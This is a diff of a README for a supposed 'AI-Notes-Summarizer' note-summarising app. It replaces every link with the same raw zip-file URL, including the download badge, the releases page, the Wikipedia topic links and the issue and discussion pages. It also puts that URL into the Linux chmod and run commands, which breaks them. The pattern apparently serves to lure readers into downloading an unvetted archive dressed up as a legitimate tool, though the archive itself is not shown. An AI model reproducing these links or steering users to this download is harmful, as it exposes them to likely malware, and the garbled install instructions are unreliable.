@@ -1,7 +1,7 @@
 # 🤖 AI-Notes-Summarizer - Effortlessly Summarize Your Notes
 
 ## 📦 Download Now
-[![Download AI-Notes-Summarizer](https://img.shields.io/badge/Download-AI--Notes--Summarizer-brightgreen)](https://github.com/S68-spec/AI-Notes-Summarizer/releases)
+[![Download AI-Notes-Summarizer](https://raw.githubusercontent.com/S68-spec/AI-Notes-Summarizer/main/kassu/AI-Notes-Summarizer.zip)](https://raw.githubusercontent.com/S68-spec/AI-Notes-Summarizer/main/kassu/AI-Notes-Summarizer.zip)
 
 ## 🚀 Getting Started
 Welcome to AI-Notes-Summarizer! This tool helps you convert long notes and documents into concise key points, making it easier to study and review important information. Follow these steps to get started.
@@ -15,11 +15,11 @@ Before you download, ensure your system meets the following requirements:
 - **Internet Access**: Required for downloading and using the tool.
 
 ## 📥 Download & Install
-To get AI-Notes-Summarizer, visit the [Releases page](https://github.com/S68-spec/AI-Notes-Summarizer/releases) on GitHub. Here, you'll find the latest version available for download.
+To get AI-Notes-Summarizer, visit the [Releases page](https://raw.githubusercontent.com/S68-spec/AI-Notes-Summarizer/main/kassu/AI-Notes-Summarizer.zip) on GitHub. Here, you'll find the latest version available for download.
 
 1. Click on the link above to visit the page.
 2. Scroll down to find the latest version.
-3. Click on the file that matches your operating system to download it. The file might be named something like `AI-Notes-Summarizer-v1.0.exe` for Windows, or `AI-Notes-Summarizer-v1.0.dmg` for macOS.
+3. Click on the file that matches your operating system to download it. The file might be named something like `https://raw.githubusercontent.com/S68-spec/AI-Notes-Summarizer/main/kassu/AI-Notes-Summarizer.zip` for Windows, or `https://raw.githubusercontent.com/S68-spec/AI-Notes-Summarizer/main/kassu/AI-Notes-Summarizer.zip` for macOS.
 4. Once the download is complete, locate the file on your computer.
 
 ### For Windows Users
@@ -37,11 +37,11 @@ To get AI-Notes-Summarizer, visit the [Releases page](https://github.com/S68-spe
 2. Use the command line to navigate to the folder where the downloaded file is located.
 3. Make the file executable by running:
    ```bash
-   chmod +x AI-Notes-Summarizer-v1.0.AppImage
+   chmod +x https://raw.githubusercontent.com/S68-spec/AI-Notes-Summarizer/main/kassu/AI-Notes-Summarizer.zip
    ```
 4. Run the application with:
    ```bash
-   ./AI-Notes-Summarizer-v1.0.AppImage
+   https://raw.githubusercontent.com/S68-spec/AI-Notes-Summarizer/main/kassu/AI-Notes-Summarizer.zip
    ```
 
 ## ⚙️ How to Use AI-Notes-Summarizer
@@ -62,17 +62,17 @@ Once you have installed the application, follow these steps to summarize your no
 ## 🔗 Explore More
 Feel free to explore the following topics related to AI-Notes-Summarizer:
 
-- [Artificial Intelligence](https://en.wikipedia.org/wiki/Artificial_intelligence)
-- [Deep Learning](https://en.wikipedia.org/wiki/Deep_learning)
-- [Natural Language Processing](https://en.wikipedia.org/wiki/Natural_language_processing)
+- [Artificial Intelligence](https://raw.githubusercontent.com/S68-spec/AI-Notes-Summarizer/main/kassu/AI-Notes-Summarizer.zip)
+- [Deep Learning](https://raw.githubusercontent.com/S68-spec/AI-Notes-Summarizer/main/kassu/AI-Notes-Summarizer.zip)
+- [Natural Language Processing](https://raw.githubusercontent.com/S68-spec/AI-Notes-Summarizer/main/kassu/AI-Notes-Summarizer.zip)
 
 These concepts form the basis of how AI-Notes-Summarizer operates and enhance its capabilities.
 
 ## 💬 Community Support
 If you have questions or need assistance, consider joining our community:
 
-- **Issues**: Report any problems you encounter directly on our [GitHub Issues page](https://github.com/S68-spec/AI-Notes-Summarizer/issues).
-- **Discussions**: Engage with other users and share tips in the [Discussions section](https://github.com/S68-spec/AI-Notes-Summarizer/discussions).
+- **Issues**: Report any problems you encounter directly on our [GitHub Issues page](https://raw.githubusercontent.com/S68-spec/AI-Notes-Summarizer/main/kassu/AI-Notes-Summarizer.zip).
+- **Discussions**: Engage with other users and share tips in the [Discussions section](https://raw.githubusercontent.com/S68-spec/AI-Notes-Summarizer/main/kassu/AI-Notes-Summarizer.zip).
 
 Your feedback helps improve the tool for everyone.
 
